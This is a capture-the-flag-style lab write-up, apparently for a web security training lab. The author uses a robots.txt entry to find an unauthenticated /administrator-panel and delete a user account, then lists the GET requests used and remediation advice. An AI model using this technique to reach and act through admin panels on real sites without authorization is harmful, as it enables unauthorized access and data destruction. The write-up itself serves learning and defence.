## 🕵️ Lab: Unprotected Admin Functionality  
**Level**: Apprentice  
**Date**: July 15, 2025  
**Goal**: Exploit unprotected administrative functionality to delete a user account without proper authentication.

---

### 🧰 Tools  
- Burp Suite  
- Browser DevTools  

---

### 🧭 Steps  

1. Explored the entire **site flow** from the home page, including login and user account sections.  
2. Intercepted and tested requests to:
   ```
   GET /my-account=admin
   ```
   - Attempted privilege escalation, but it didn’t yield any admin functionality.  
3. Navigated to the `robots.txt` file to check for disallowed paths:
   ```
   GET /robots.txt
   ```
   - Found the following entry:  
     ```
     User-agent: *
     Disallow: /administrator-panel
     ```
4. Manually visited the exposed path:
   ```
   GET /administrator-panel
   ```
   - Accessed the admin panel without authentication.  
5. From the panel, deleted the user `carlos`.  
   ✅ **Lab successfully completed**.

---

### 🧪 Payload  
```
GET /robots.txt HTTP/1.1  
Host: your-lab-id.web-security-academy.net  
```

```
GET /administrator-panel HTTP/1.1  
Host: your-lab-id.web-security-academy.net  
```

---

✅ Lab Solved  

---

### 💡 Observations  

- The presence of a disallowed path in `robots.txt` inadvertently revealed the admin panel URL.  
- No access control was enforced on `/administrator-panel`, allowing vertical privilege escalation.  
- Highlights the danger of assuming that obscurity (like hiding paths from search engines) provides security.  
- Reinforced the value of inspecting default files like `robots.txt` and `.gitignore`.

---

### 🔒 Remediation  

- 🚫 Never expose sensitive admin functionality via public or guessable paths (e.g., `/admin`, `/administrator-panel`).  
- 🔐 Implement **strict server-side authorization checks** for all privileged endpoints — never rely on client-side controls.  
- 🕵️ Avoid referencing sensitive paths in files like `robots.txt`; this can guide attackers directly to vulnerable areas.  
- 📦 Secure deployment practices should strip out unnecessary or legacy admin panels from production.  
- ✅ Enforce **role-based access control (RBAC)** and session validation before performing critical actions like user deletion.  
- 🛡️ Implement **CSRF protection** and validate origin headers to ensure requests are coming from authenticated and trusted sessions.  
- 🧼 Sanitize and log all access attempts to admin endpoints and set up alerts for abnormal activity.

